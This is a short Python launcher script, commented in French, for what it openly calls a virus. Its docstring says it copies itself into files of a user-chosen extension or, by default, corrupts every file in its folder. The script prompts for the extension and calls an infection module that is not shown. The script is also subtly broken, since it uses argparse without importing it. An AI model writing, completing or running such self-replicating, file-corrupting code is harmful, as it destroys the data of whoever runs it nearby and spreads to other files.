# -*- coding: utf-8 -*-
"""ATTENTION A TESTER DANS UN DOSSIER CONTENANT DES FICHIERS INUTILISES !!!!!


Author : Cardin Patson
TEST : python3 main.py -infection
RESULTAT : Se duplique dans les fichiers qui ont l'extension qui a été entré par l'utilisateur
           Si aucune extension n'est entré, Corrompt tous les fichiers qui se trouve au même emplacement que lui
"""


from module.infection import Infection
import sys

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-i", "--infection", help="Infecte les fichiers contenus dans le dossier ou se trouve le main.py", action="store_true")

    args = parser.parse_args()

    if args.infection:
        extension = input(
            "Entrez l'extension des fichiers (ex : txt , pptx) à corrompre (par défaut corrompt tous les fichiers) : ")
        virus = Infection(extension)
        virus.infect()
    else:
        print(
            "Entrez 'python3 main.py -h' pour voir la liste des options disponibles\n")
